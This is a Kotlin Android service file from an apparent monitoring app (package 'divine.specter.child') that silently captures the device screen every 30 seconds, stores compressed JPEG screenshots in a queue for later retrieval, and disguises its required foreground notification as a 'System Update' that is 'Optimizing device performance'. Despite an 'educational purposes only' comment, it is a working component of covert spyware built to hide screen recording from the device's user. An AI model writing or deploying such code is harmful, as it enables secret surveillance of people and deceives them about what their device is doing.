package com.divine.specter.child.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.util.DisplayMetrics
import android.view.WindowManager
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream
import java.io.File
import java.nio.ByteBuffer
import java.util.concurrent.ConcurrentLinkedQueue

/**
 * Screen capture service - records screen at intervals.
 * Educational/training purposes only.
 */
class ScreenCaptureService : Service() {

    companion object {
        const val CHANNEL_ID = "screen_capture"
        const val ACTION_START = "com.divine.specter.child.START_CAPTURE"
        const val ACTION_STOP = "com.divine.specter.child.STOP_CAPTURE"

        private val screenshots = ConcurrentLinkedQueue<Screenshot>()
        var instance: ScreenCaptureService? = null
        var isCapturing = false

        fun getAndClearScreenshots(): List<Screenshot> {
            val captured = mutableListOf<Screenshot>()
            while (screenshots.isNotEmpty()) {
                screenshots.poll()?.let { captured.add(it) }
            }
            return captured
        }
    }

    data class Screenshot(
        val timestamp: Long,
        val imageData: ByteArray,
        val width: Int,
        val height: Int
    )

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var captureJob: Job? = null

    private var screenWidth = 0
    private var screenHeight = 0
    private var screenDensity = 0

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()

        // Get screen dimensions
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        wm.defaultDisplay.getMetrics(metrics)
        screenWidth = metrics.widthPixels
        screenHeight = metrics.heightPixels
        screenDensity = metrics.densityDpi
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                val resultCode = intent.getIntExtra("resultCode", -1)
                val data = intent.getParcelableExtra<Intent>("data")

                if (resultCode != -1 && data != null) {
                    startForeground(1, createNotification())
                    startCapture(resultCode, data)
                }
            }
            ACTION_STOP -> {
                stopCapture()
                stopSelf()
            }
        }
        return START_STICKY
    }

    private fun startCapture(resultCode: Int, data: Intent) {
        if (isCapturing) return

        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = projectionManager.getMediaProjection(resultCode, data)

        // Create ImageReader
        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)

        // Create VirtualDisplay
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            screenWidth,
            screenHeight,
            screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface,
            null,
            null
        )

        isCapturing = true
        startPeriodicCapture()
    }

    private fun startPeriodicCapture() {
        captureJob = CoroutineScope(Dispatchers.Default).launch {
            while (isActive && isCapturing) {
                captureScreen()
                delay(30_000) // Capture every 30 seconds
            }
        }
    }

    private fun captureScreen() {
        val image = imageReader?.acquireLatestImage() ?: return

        try {
            val planes = image.planes
            val buffer: ByteBuffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * screenWidth

            // Create bitmap
            val bitmap = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)

            // Compress to JPEG
            val outputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, outputStream) // 50% quality
            val imageData = outputStream.toByteArray()

            // Store screenshot
            val screenshot = Screenshot(
                timestamp = System.currentTimeMillis(),
                imageData = imageData,
                width = screenWidth,
                height = screenHeight
            )
            screenshots.offer(screenshot)

            // Limit queue size
            while (screenshots.size > 20) {
                screenshots.poll()
            }

            bitmap.recycle()
        } finally {
            image.close()
        }
    }

    private fun stopCapture() {
        isCapturing = false
        captureJob?.cancel()
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()

        virtualDisplay = null
        imageReader = null
        mediaProjection = null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screen Capture",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Optimizing device performance")
                .setSmallIcon(android.R.drawable.ic_menu_view)
                .build()
        } else {
            Notification.Builder(this)
                .setContentTitle("System Update")
                .setContentText("Optimizing device performance")
                .setSmallIcon(android.R.drawable.ic_menu_view)
                .build()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopCapture()
        instance = null
    }
}
